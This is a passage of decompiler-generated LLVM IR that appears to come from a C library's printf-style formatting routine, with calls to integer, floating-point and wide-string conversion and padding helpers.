  %v1_b624 = and i32 %v0_b630, 32
  %v2_b624 = icmp eq i32 %v1_b624, 0
  %.175 = select i1 %v2_b624, i32 87, i32 44
  store i32 %.175, i32* @r5, align 4
  %v1_b630 = and i32 %v0_b630, 64
  %v2_b630 = icmp eq i32 %v1_b630, 0
  br i1 %v2_b630, label %bb139, label %bb138

bb138:                                            ; preds = %dec_label_pc_b620
  %.176 = select i1 %v2_b624, i32 215, i32 172
  store i32 %.176, i32* @r5, align 4
  br label %bb139

bb139:                                            ; preds = %bb135, %dec_label_pc_b620, %bb138
  br i1 %v3_b63c, label %.thread84, label %dec_label_pc_b644

.thread84:                                        ; preds = %bb139
  %v5_b63c = sub nsw i32 0, %v4_b610
  store i32 %v5_b63c, i32* @r4, align 4
  br label %dec_label_pc_b65c

dec_label_pc_b644:                                ; preds = %bb139
  br i1 %v7_b724, label %bb140, label %dec_label_pc_b650

bb140:                                            ; preds = %dec_label_pc_b644
  store i32 55, i32* @r5, align 4
  br label %dec_label_pc_b65c

dec_label_pc_b650:                                ; preds = %dec_label_pc_b644
  br i1 %v7_b670, label %dec_label_pc_b660, label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %.thread84, %bb140, %dec_label_pc_b650
  %v0_b68886 = phi i32 [ %v5_b63c, %.thread84 ], [ %v4_b610, %bb140 ], [ %v4_b610, %dec_label_pc_b650 ]
  br label %dec_label_pc_b660

dec_label_pc_b660:                                ; preds = %dec_label_pc_b650, %dec_label_pc_b65c
  %v0_b68885 = phi i32 [ %v0_b68886, %dec_label_pc_b65c ], [ %v4_b610, %dec_label_pc_b650 ]
  %storemerge92 = phi i32 [ 11, %dec_label_pc_b65c ], [ 6, %dec_label_pc_b650 ]
  store i32 %storemerge92, i32* @r7, align 4
  %v3_b660 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b660, i32* %r3.global-to-local, align 4
  %v1_b664 = icmp slt i32 %v3_b660, 0
  %v7_b668. = select i1 %v1_b664, i32 %v7_b668, i32 32
  store i32 %v7_b668., i32* @sb, align 4
  br i1 %v7_b670, label %bb145, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_b660
  store i32 %v2_b5bc, i32* @lr, align 4
  %v2_b678 = load i32, i32* @ip, align 4
  %v5_b678 = mul i32 %v2_b678, 4
  %v6_b678 = add i32 %v5_b678, %v2_b5bc
  store i32 %v6_b678, i32* %r3.global-to-local, align 4
  %v2_b67c = add i32 %v6_b678, -260
  %v3_b67c = inttoptr i32 %v2_b67c to i32*
  %v4_b67c = load i32, i32* %v3_b67c, align 4
  store i32 %v4_b67c, i32* %r3.global-to-local, align 4
  %v2_b684 = and i32 %v4_b67c, 3840
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_b660, %.thread16
  %storemerge94 = phi i32 [ %v2_b684, %.thread16 ], [ 1024, %dec_label_pc_b660 ]
  store i32 %storemerge94, i32* @r0, align 4
  store i32 %v0_b68885, i32* @r2, align 4
  store i32 %tmp101, i32* @r1, align 4
  %v0_b690 = call i32 @_load_inttype()
  %v0_b694 = load i32, i32* @r1, align 4
  store i32 %v0_b694, i32* %r2.global-to-local, align 4
  %v0_b6a0 = load i32, i32* @r4, align 4
  store i32 %v0_b6a0, i32* %r3.global-to-local, align 4
  store i32 %v2_b6a4, i32* %r0.global-to-local, align 4
  %v0_b6a8 = load i32, i32* @r5, align 4
  %v6_b6ac = call i32 @_uintmaxtostr(i8* %v5_b6ac, i32 %v0_b690, i32 %v0_b694, i32 %v0_b6a0, i32 %v0_b6a8)
  store i32 %v6_b6ac, i32* %r0.global-to-local, align 4
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  store i32 %v6_b6ac, i32* @r6, align 4
  br i1 %v3_b6bc, label %bb148, label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %bb145
  %v7_b6ac = inttoptr i32 %v6_b6ac to i8*
  %v3_b6c0 = load i8, i8* %v7_b6ac, align 1
  %v7_b6c4 = icmp eq i8 %v3_b6c0, 45
  %v2_b6cc = or i32 %v0_b630, 2
  %v2_b6cc.stack_var_-316.4 = select i1 %v7_b6c4, i32 %v2_b6cc, i32 %v0_b630
  store i32 %v2_b6cc.stack_var_-316.4, i32* %r3.global-to-local, align 4
  br i1 %v7_b6c4, label %.thread18, label %dec_label_pc_b6e0

.thread18:                                        ; preds = %dec_label_pc_b6c0
  %v3_b6d0 = add i32 %v6_b6ac, 1
  store i32 %v3_b6d0, i32* @r6, align 4
  store i32 2, i32* @r7, align 4
  br label %bb148

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b6c0
  %v1_b6e0 = and i32 %v2_b6cc.stack_var_-316.4, 2
  %v2_b6e0 = icmp eq i32 %v1_b6e0, 0
  br i1 %v2_b6e0, label %dec_label_pc_b6ec, label %bb146

bb146:                                            ; preds = %dec_label_pc_b6e0
  store i32 0, i32* @r7, align 4
  br label %bb148

dec_label_pc_b6ec:                                ; preds = %dec_label_pc_b6e0
  %v1_b6ec = urem i32 %v2_b6cc.stack_var_-316.4, 2
  %v2_b6ec = icmp eq i32 %v1_b6ec, 0
  br i1 %v2_b6ec, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_b6ec
  store i32 4, i32* @r7, align 4
  br label %bb148

bb148:                                            ; preds = %.thread18, %bb146, %bb145, %dec_label_pc_b6ec, %bb147
  %v0_b748 = phi i32 [ %v6_b6ac, %bb145 ], [ %v3_b6d0, %.thread18 ], [ %v6_b6ac, %dec_label_pc_b6ec ], [ %v6_b6ac, %bb147 ], [ %v6_b6ac, %bb146 ]
  %v0_b704 = phi i32 [ %v0_b630, %bb145 ], [ %v2_b6cc, %.thread18 ], [ %v0_b630, %dec_label_pc_b6ec ], [ %v0_b630, %bb147 ], [ %v0_b630, %bb146 ]
  %v3_b6f4 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b6f4, i32* %r2.global-to-local, align 4
  store i32 %v0_b704, i32* %r3.global-to-local, align 4
  %v1_b6fc = icmp slt i32 %v3_b6f4, 0
  br i1 %v1_b6fc, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v0_b72c = phi i32 [ %v3_b6f4, %bb148 ], [ 1, %bb149 ]
  %v1_b704 = and i32 %v0_b704, 16
  %v2_b704 = icmp eq i32 %v1_b704, 0
  store i32 %v2_b8d8, i32* %r3.global-to-local, align 4
  %v2_b70c = sub i32 %v2_b8d8, %v0_b748
  %v1_b710 = add i32 %v2_b70c, 127
  store i32 %v1_b710, i32* @r5, align 4
  br i1 %v2_b704, label %bb157, label %dec_label_pc_b718

dec_label_pc_b718:                                ; preds = %bb150
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  br i1 %tmp197, label %bb151, label %bb152

bb151:                                            ; preds = %dec_label_pc_b718
  store i32 6, i32* @r7, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_b718, %bb151
  br i1 %v7_b724, label %bb153, label %bb154

bb153:                                            ; preds = %bb152
  store i32 9, i32* @r7, align 4
  br label %bb154

bb154:                                            ; preds = %bb152, %bb153
  %tmp198 = icmp ugt i32 %v0_b72c, %v1_b710
  br i1 %tmp198, label %bb157, label %bb155

bb155:                                            ; preds = %bb154
  br i1 %v11_b730, label %dec_label_pc_b738, label %bb157

dec_label_pc_b738:                                ; preds = %bb155
  %v1_b738 = inttoptr i32 %v0_b748 to i8*
  %v2_b738 = load i8, i8* %v1_b738, align 1
  %v3_b738 = zext i8 %v2_b738 to i32
  store i32 %v3_b738, i32* %r3.global-to-local, align 4
  %v7_b73c = icmp eq i8 %v2_b738, 48
  br i1 %v7_b73c, label %bb156, label %.thread25

bb156:                                            ; preds = %dec_label_pc_b738
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb157

.thread25:                                        ; preds = %dec_label_pc_b738
  %v2_b744 = add i32 %v2_b70c, 128
  store i32 %v2_b744, i32* %r2.global-to-local, align 4
  br label %bb157

bb157:                                            ; preds = %bb154, %bb156, %bb155, %bb150, %.thread25
  %v5_b780 = phi i32 [ %v0_b72c, %bb155 ], [ %v0_b72c, %bb150 ], [ 1, %bb156 ], [ %v2_b744, %.thread25 ], [ %v0_b72c, %bb154 ]
  %v1_b748 = inttoptr i32 %v0_b748 to i8*
  %v2_b748 = load i8, i8* %v1_b748, align 1
  %v3_b748 = zext i8 %v2_b748 to i32
  store i32 %v3_b748, i32* %r3.global-to-local, align 4
  %v7_b74c = icmp eq i8 %v2_b748, 48
  br i1 %v7_b74c, label %dec_label_pc_b754, label %dec_label_pc_b77c

dec_label_pc_b754:                                ; preds = %bb157
  store i32 %tmp102, i32* %r3.global-to-local, align 4
  %v0_b758 = load i32, i32* @r7, align 4
  %v7_b75c = icmp slt i32 %v0_b758, 6
  br i1 %v7_b75c, label %bb159, label %bb158

bb158:                                            ; preds = %dec_label_pc_b754
  store i32 11, i32* @r7, align 4
  br label %bb159

bb159:                                            ; preds = %dec_label_pc_b754, %bb158
  br i1 %v7_b670, label %.thread26, label %dec_label_pc_b770

.thread26:                                        ; preds = %bb159
  store i32 ptrtoint ([6 x i8]* @global_var_1434c.450 to i32), i32* @r6, align 4
  store i32 5, i32* @r5, align 4
  br label %dec_label_pc_b8f0

dec_label_pc_b770:                                ; preds = %bb159
  %v2_b770 = icmp eq i32 %v5_b780, 0
  br i1 %v2_b770, label %bb160, label %dec_label_pc_b77c

bb160:                                            ; preds = %dec_label_pc_b770
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_b8f0

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b770, %bb157
  %v2_b77c = sub i32 %v5_b780, %v1_b710
  %tmp199 = icmp ugt i32 %v5_b780, %v1_b710
  br i1 %tmp199, label %.thread90, label %dec_label_pc_b8f0

.thread90:                                        ; preds = %dec_label_pc_b77c
  store i32 %v2_b77c, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b600
  br i1 %tmp196, label %dec_label_pc_b7c8, label %dec_label_pc_b794

dec_label_pc_b794:                                ; preds = %dec_label_pc_b78c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  %v0_b7a0 = load i32, i32* @fp, align 4
  store i32 %v0_b7a0, i32* %r0.global-to-local, align 4
  %v2_b7a4 = load i32, i32* %v1_b5e8, align 4
  %v5_b7a4 = load i32, i32* %v4_b7a4, align 4
  store i32 %v5_b7a4, i32* %r2.global-to-local, align 4
  store i32 %v2_b7a8, i32* %r3.global-to-local, align 4
  %v5_b7ac = sext i32 %v2_b7a4 to i64
  %v6_b7ac = bitcast i64 %v5_b7ac to double
  %v7_b7ac = call i32 @_fpmaxtostr(i32 %v0_b7a0, double %v6_b7ac, i32 %v5_b7a4, i32 %v2_b7a8, i32 46092)
  store i32 %v7_b7ac, i32* %r0.global-to-local, align 4
  %v1_b7b0 = icmp slt i32 %v7_b7ac, 0
  br i1 %v1_b7b0, label %dec_label_pc_ba5c, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b794
  %v2_b7bc = add i32 %v7_b7ac, %stack_var_-336.2
  store i32 %v2_b7bc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba48

dec_label_pc_b7c8:                                ; preds = %dec_label_pc_b78c
  br i1 %v3_b7cc, label %dec_label_pc_b868, label %dec_label_pc_b7d0

dec_label_pc_b7d0:                                ; preds = %dec_label_pc_b7c8
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  br i1 %v7_b7c8, label %dec_label_pc_b7e0, label %dec_label_pc_b830

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b7d0
  %v2_b7e0 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b7e0, i32* %r3.global-to-local, align 4
  %v9_b7e4 = icmp eq i32 %v2_b7e0, 0
  store i32 %v2_b7e0, i32* %stack_var_-44, align 4
  br i1 %v9_b7e4, label %dec_label_pc_b8f8, label %dec_label_pc_b7f0

dec_label_pc_b7f0:                                ; preds = %dec_label_pc_b7e0
  %v3_b7f0 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b7f0, i32* %r3.global-to-local, align 4
  store i32 %v2_b7f4, i32* @r0, align 4
  %v5_b800 = icmp slt i32 %v3_b7f0, -1
  br i1 %v5_b800, label %bb162, label %bb161

bb161:                                            ; preds = %dec_label_pc_b7f0
  br label %bb162

bb162:                                            ; preds = %dec_label_pc_b7f0, %bb161
  %storemerge193 = phi i32 [ %v3_b7f0, %bb161 ], [ -1, %dec_label_pc_b7f0 ]
  store i32 %storemerge193, i32* @r2, align 4
  store i32 %v2_b7f4, i32* @r1, align 4
  store i32 %v2_b808, i32* %r3.global-to-local, align 4
  %v0_b80c = call i32 @__GI_wcsrtombs()
  store i32 %v0_b80c, i32* %r0.global-to-local, align 4
  %v7_b810 = icmp eq i32 %v0_b80c, -1
  store i32 %v0_b80c, i32* @r5, align 4
  br i1 %v7_b810, label %dec_label_pc_ba5c, label %dec_label_pc_b81c

dec_label_pc_b81c:                                ; preds = %bb162
  %v0_b81c = load i32, i32* @sl, align 4
  store i32 %v0_b81c, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_b81c, i32* @r6, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b830:                                ; preds = %dec_label_pc_b7d0
  store i32 %v2_b8d8, i32* %r8.global-to-local, align 4
  %v2_b834 = load i32, i32* %v1_b5e8, align 4
  store i32 %v2_b808, i32* %r2.global-to-local, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  %v3_b840 = call i32 @__GI_wcrtomb(i32 %v2_b8d8, i32 %v2_b834, i32 %v2_b808)
  store i32 %v3_b840, i32* %r0.global-to-local, align 4
  %v7_b844 = icmp eq i32 %v3_b840, -1
  store i32 %v3_b840, i32* @r5, align 4
  br i1 %v7_b844, label %dec_label_pc_ba5c, label %dec_label_pc_b850

dec_label_pc_b850:                                ; preds = %dec_label_pc_b830
  %v0_b850 = load i32, i32* @sl, align 4
  store i32 %v0_b850, i32* @r4, align 4
  store i32 %v2_b8d8, i32* @r6, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  %v1_b860 = trunc i32 %v0_b850 to i8
  %v2_b860 = load i32, i32* %r8.global-to-local, align 4
  %v4_b860 = add i32 %v2_b860, %v3_b840
  %v5_b860 = inttoptr i32 %v4_b860 to i8*
  store i8 %v1_b860, i8* %v5_b860, align 1
  %v0_b910.pre.pre = load i32, i32* @r5, align 4
  %v1_b910.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b868:                                ; preds = %dec_label_pc_b7c8
  br i1 %v3_b86c, label %dec_label_pc_b8cc, label %dec_label_pc_b870

dec_label_pc_b870:                                ; preds = %dec_label_pc_b868
  store i32 %tmp101, i32* %r0.global-to-local, align 4
  %v2_b878 = load i32, i32* %v1_b5e8, align 4
  br i1 %v7_b868, label %dec_label_pc_b878, label %dec_label_pc_b8a4

dec_label_pc_b878:                                ; preds = %dec_label_pc_b870
  store i32 %v2_b878, i32* @r6, align 4
  %v2_b87c = icmp eq i32 %v2_b878, 0
  br i1 %v2_b87c, label %dec_label_pc_b8f8, label %dec_label_pc_b884

dec_label_pc_b884:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b8d4
  %v0_b894 = phi i32 [ %v2_b878, %dec_label_pc_b878 ], [ %v3_b8e4, %dec_label_pc_b8d4 ]
  %v3_b884 = load i32, i32* %stack_var_-328, align 4
  store i32 %v3_b884, i32* %r3.global-to-local, align 4
  %v5_b890 = icmp slt i32 %v3_b884, -1
  br i1 %v5_b890, label %bb164, label %bb163

bb163:                                            ; preds = %dec_label_pc_b884
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_b884, %bb163
  %storemerge194 = phi i32 [ %v3_b884, %bb163 ], [ -1, %dec_label_pc_b884 ]
  store i32 %storemerge194, i32* @r1, align 4
  store i32 %v0_b894, i32* %r0.global-to-local, align 4
  %v1_b898 = inttoptr i32 %v0_b894 to i8*
  %v2_b898 = call i32 @strnlen(i8* %v1_b898)
  store i32 %v2_b898, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b900

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b870
  store i32 %v2_b878, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_b8d8, i32* @r6, align 4
  store i32 %v2_b878, i32* %stack_var_-180, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b868
  br i1 %v7_b8cc, label %dec_label_pc_b8d4, label %dec_label_pc_ba5c

dec_label_pc_b8d4:                                ; preds = %dec_label_pc_b8cc
  %v0_b8d4 = call i32 @__errno_location()
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  %v1_b8dc = inttoptr i32 %v0_b8d4 to i32*
  %v2_b8dc = load i32, i32* %v1_b8dc, align 4
  store i32 %v2_b8dc, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_b8e4 = call i32 @__GI___glibc_strerror_r(i32 %v2_b8dc, i32 %v2_b8d8, i32 128)
  store i32 %v3_b8e4, i32* %r0.global-to-local, align 4
  store i32 %v3_b8e4, i32* @r6, align 4
  br label %dec_label_pc_b884

dec_label_pc_b8f0:                                ; preds = %dec_label_pc_b77c, %.thread26, %bb160
  %v0_b910.pre81 = phi i32 [ 0, %bb160 ], [ 5, %.thread26 ], [ %v1_b710, %dec_label_pc_b77c ]
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_b90cthread-pre-split

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b7e0
  store i32 ptrtoint ([7 x i8]* @global_var_14354.453 to i32), i32* @r6, align 4
  br label %dec_label_pc_b900

dec_label_pc_b900:                                ; preds = %bb164, %dec_label_pc_b8f8
  %storemerge = phi i32 [ 6, %dec_label_pc_b8f8 ], [ %v2_b898, %bb164 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i32 11, i32* @r7, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b90cthread-pre-split:                ; preds = %.thread90, %dec_label_pc_b850, %dec_label_pc_b8a4, %dec_label_pc_b8f0
  %v1_b910.pre = phi i32 [ 0, %dec_label_pc_b8f0 ], [ %v1_b910.pre.pre, %dec_label_pc_b850 ], [ 0, %dec_label_pc_b8a4 ], [ %v2_b77c, %.thread90 ]
  %v0_b910.pre = phi i32 [ %v0_b910.pre81, %dec_label_pc_b8f0 ], [ %v0_b910.pre.pre, %dec_label_pc_b850 ], [ 1, %dec_label_pc_b8a4 ], [ %v1_b710, %.thread90 ]
  %stack_var_-316.2.ph = phi i32 [ %v0_b704, %dec_label_pc_b8f0 ], [ %v0_b630, %dec_label_pc_b850 ], [ %v0_b630, %dec_label_pc_b8a4 ], [ %v0_b704, %.thread90 ]
  %v0_b90c.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_b90c

dec_label_pc_b90c:                                ; preds = %dec_label_pc_b90cthread-pre-split, %dec_label_pc_b81c, %dec_label_pc_b900
  %v1_b94c = phi i32 [ %v1_b910.pre, %dec_label_pc_b90cthread-pre-split ], [ %v0_b81c, %dec_label_pc_b81c ], [ 0, %dec_label_pc_b900 ]
  %v0_b910 = phi i32 [ %v0_b910.pre, %dec_label_pc_b90cthread-pre-split ], [ %v0_b80c, %dec_label_pc_b81c ], [ %storemerge, %dec_label_pc_b900 ]
  %v0_b918 = phi i32 [ %v0_b90c.pr, %dec_label_pc_b90cthread-pre-split ], [ 11, %dec_label_pc_b81c ], [ 11, %dec_label_pc_b900 ]
  %v0_b954 = phi i32 [ %stack_var_-316.2.ph, %dec_label_pc_b90cthread-pre-split ], [ %v0_b630, %dec_label_pc_b81c ], [ %v0_b630, %dec_label_pc_b900 ]
  %v7_b90c = icmp eq i32 %v0_b918, 11
  %v2_b910 = add i32 %v0_b910, %v1_b94c
  br i1 %v7_b90c, label %dec_label_pc_b928, label %bb165

bb165:                                            ; preds = %dec_label_pc_b90c
  %v7_b920 = icmp sgt i32 %v0_b918, 5
  %. = select i1 %v7_b920, i32 2, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_b924 = add i32 %., %v2_b910
  br label %dec_label_pc_b928

dec_label_pc_b928:                                ; preds = %dec_label_pc_b90c, %bb165
  %v0_b93c = phi i32 [ %v2_b910, %dec_label_pc_b90c ], [ %v2_b924, %bb165 ]
  store i32 %tmp97, i32* %r2.global-to-local, align 4
  %v2_b92c = sub i32 %tmp97, %v0_b93c
  %v3_b92c = icmp uge i32 %tmp97, %v0_b93c
  %v9_b92c = icmp eq i32 %tmp97, %v0_b93c
  %v2_b930 = xor i1 %v3_b92c, true
  %v3_b930 = or i1 %v9_b92c, %v2_b930
  br i1 %v3_b930, label %bb166, label %bb167

bb166:                                            ; preds = %dec_label_pc_b928
  store i32 0, i32* @sl, align 4
  br label %bb167

bb167:                                            ; preds = %dec_label_pc_b928, %bb166
  %v2_b934 = xor i1 %v9_b92c, true
  %v3_b934 = and i1 %v3_b92c, %v2_b934
  br i1 %v3_b934, label %bb168, label %._crit_edge

._crit_edge:                                      ; preds = %bb167
  %v1_b93c.pre = load i32, i32* @sl, align 4
  br label %bb169

bb168:                                            ; preds = %bb167
  store i32 %v2_b92c, i32* @sl, align 4
  br label %bb169

bb169:                                            ; preds = %._crit_edge, %bb168
  %v2_b94c = phi i32 [ %v1_b93c.pre, %._crit_edge ], [ %v2_b92c, %bb168 ]
  %v2_b93c = add i32 %v0_b93c, %stack_var_-336.2
  %v2_b940 = add i32 %v2_b93c, %v2_b94c
  store i32 %v2_b940, i32* @ip, align 4
  store i32 %v0_b954, i32* %r3.global-to-local, align 4
  %v0_b948 = load i32, i32* @sb, align 4
  %v7_b948 = icmp eq i32 %v0_b948, 48
  br i1 %v7_b948, label %bb170, label %.thread29

bb170:                                            ; preds = %bb169
  %v3_b94c = add i32 %v2_b94c, %v1_b94c
  store i32 %v3_b94c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread29

.thread29:                                        ; preds = %bb169, %bb170
  %v0_b968 = phi i32 [ %v2_b94c, %bb169 ], [ 0, %bb170 ]
  %v1_b954 = and i32 %v0_b954, 8
  store i32 %v1_b954, i32* @r8, align 4
  %v2_b954 = icmp eq i32 %v1_b954, 0
  br i1 %v2_b954, label %dec_label_pc_b960, label %dec_label_pc_b97c

dec_label_pc_b960:                                ; preds = %.thread29
  %v0_b960 = load i32, i32* @fp, align 4
  store i32 %v0_b960, i32* %r0.global-to-local, align 4
  store i32 %v0_b968, i32* %r2.global-to-local, align 4
  %v4_b96c = call i32 @_charpad(i32 %v0_b960, i8 32, i32 %v0_b968)
  store i32 %v4_b96c, i32* %r0.global-to-local, align 4
  %v1_b970 = load i32, i32* @sl, align 4
  %v9_b970 = icmp eq i32 %v4_b96c, %v1_b970
  br i1 %v9_b970, label %dec_label_pc_b978, label %dec_label_pc_ba5c

dec_label_pc_b978:                                ; preds = %dec_label_pc_b960
  %v0_b978 = load i32, i32* @r8, align 4
  store i32 %v0_b978, i32* @sl, align 4
  %v0_b984.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %.thread29, %dec_label_pc_b978
  %v0_b984 = phi i32 [ %v0_b918, %.thread29 ], [ %v0_b984.pre, %dec_label_pc_b978 ]
  %v0_b980 = load i32, i32* @fp, align 4
  %v2_b984 = add i32 %v0_b984, ptrtoint (i32* @global_var_1435c.455 to i32)
  store i32 %v2_b984, i32* %r0.global-to-local, align 4
  %v2_b988 = inttoptr i32 %v2_b984 to i8*
  %v3_b988 = call i32 @__GI_fputs_unlocked(i8* %v2_b988, i32 %v0_b980)
  %v0_b98c = load i32, i32* @fp, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v0_b994 = load i32, i32* @r4, align 4
  store i32 %v0_b994, i32* %r2.global-to-local, align 4
  %v4_b998 = call i32 @_charpad(i32 %v0_b98c, i8 48, i32 %v0_b994)
  store i32 %v4_b998, i32* %r0.global-to-local, align 4
  %v1_b99c = load i32, i32* @r4, align 4
  %v9_b99c = icmp eq i32 %v4_b998, %v1_b99c
  br i1 %v9_b99c, label %dec_label_pc_b9a4, label %dec_label_pc_ba5c

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b97c
  %v3_b9a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9a4, i32* %r3.global-to-local, align 4
  %v2_b9a8 = icmp eq i32 %v3_b9a4, 0
  br i1 %v2_b9a8, label %dec_label_pc_b9b8, label %dec_label_pc_ba18thread-pre-split

dec_label_pc_b9b8:                                ; preds = %dec_label_pc_b9a4
  %v0_b9b8 = load i32, i32* @r5, align 4
  %v2_b9b8 = icmp eq i32 %v0_b9b8, 0
  br i1 %v2_b9b8, label %bb171, label %bb172

bb171:                                            ; preds = %dec_label_pc_b9b8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread36

bb172:                                            ; preds = %dec_label_pc_b9b8
  %v1_b9c0 = load i32, i32* @r6, align 4
  store i32 %v1_b9c0, i32* %r0.global-to-local, align 4
  %v1_b9c8 = load i32, i32* @fp, align 4
  store i32 %v1_b9c8, i32* %r2.global-to-local, align 4
  br label %.thread36

.thread36:                                        ; preds = %bb171, %bb172
  store i32 47568, i32* @lr, align 4
  %v1_b9cc = xor i1 %v2_b9b8, true
  call void @__pseudo_cond_branch(i1 %v1_b9cc, i32 ptrtoint (i32* @global_var_eec0.446 to i32))
  %v0_b9d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_b9d0 = load i32, i32* @r5, align 4
  %v9_b9d0 = icmp eq i32 %v0_b9d0, %v1_b9d0
  br i1 %v9_b9d0, label %dec_label_pc_ba30, label %dec_label_pc_ba5c

dec_label_pc_b9dc:                                ; preds = %dec_label_pc_ba18
  %v2_b9dc = icmp ult i32 %v1_b9e0, 128
  %.v1_b9e0 = select i1 %v2_b9dc, i32 %v1_b9e0, i32 128
  store i32 %.v1_b9e0, i32* @r2, align 4
  %v0_b9e8 = call i32 @__GI_wcsrtombs()
  store i32 %v0_b9e8, i32* @r4, align 4
  %v2_b9ec = icmp eq i32 %v0_b9e8, 0
  store i32 %v0_b9e8, i32* %r3.global-to-local, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  %v0_b9fc = load i32, i32* @fp, align 4
  store i32 %v0_b9fc, i32* %r2.global-to-local, align 4
  br i1 %v2_b9ec, label %dec_label_pc_ba0c, label %dec_label_pc_ba04

dec_label_pc_ba04:                                ; preds = %dec_label_pc_b9dc
  %v3_ba04 = call i32 @__stdio_fwrite(i32 %v2_b8d8, i32 %v0_b9e8, i32 %v0_b9fc)
  store i32 %v3_ba04, i32* %r0.global-to-local, align 4
  store i32 %v3_ba04, i32* %r3.global-to-local, align 4
  %v1_ba0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ba0c

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9dc, %dec_label_pc_ba04
  %v1_ba0c = phi i32 [ 0, %dec_label_pc_b9dc ], [ %v1_ba0c.pre, %dec_label_pc_ba04 ]
  %v0_ba10 = phi i32 [ 0, %dec_label_pc_b9dc ], [ %v3_ba04, %dec_label_pc_ba04 ]
  %v9_ba0c = icmp eq i32 %v0_ba10, %v1_ba0c
  %v1_ba10 = load i32, i32* @r5, align 4
  %v2_ba10 = sub i32 %v1_ba10, %v0_ba10
  store i32 %v2_ba10, i32* @r5, align 4
  br i1 %v9_ba0c, label %dec_label_pc_ba18, label %dec_label_pc_ba5c

dec_label_pc_ba18thread-pre-split:                ; preds = %dec_label_pc_b9a4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_ba1c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_ba18thread-pre-split, %dec_label_pc_ba0c
  %v1_b9e0 = phi i32 [ %v0_ba1c.pr, %dec_label_pc_ba18thread-pre-split ], [ %v2_ba10, %dec_label_pc_ba0c ]
  store i32 %v2_b8d8, i32* @r6, align 4
  %v2_ba1c = icmp eq i32 %v1_b9e0, 0
  store i32 %v2_b7f4, i32* @r1, align 4
  store i32 %v2_b808, i32* %r3.global-to-local, align 4
  store i32 %v2_b8d8, i32* @r0, align 4
  br i1 %v2_ba1c, label %dec_label_pc_ba30, label %dec_label_pc_b9dc

dec_label_pc_ba30:                                ; preds = %dec_label_pc_ba18, %.thread36
  %v0_ba30 = load i32, i32* @fp, align 4
  store i32 %v0_ba30, i32* %r0.global-to-local, align 4
  %v0_ba38 = load i32, i32* @sl, align 4
  store i32 %v0_ba38, i32* %r2.global-to-local, align 4
  %v4_ba3c = call i32 @_charpad(i32 %v0_ba30, i8 32, i32 %v0_ba38)
  store i32 %v4_ba3c, i32* %r0.global-to-local, align 4
  %v1_ba40 = load i32, i32* @sl, align 4
  %v9_ba40 = icmp eq i32 %v4_ba3c, %v1_ba40
  br i1 %v9_ba40, label %dec_label_pc_ba48, label %dec_label_pc_ba5c

dec_label_pc_ba48:                                ; preds = %dec_label_pc_ba30, %dec_label_pc_b7b8, %dec_label_pc_b5dc
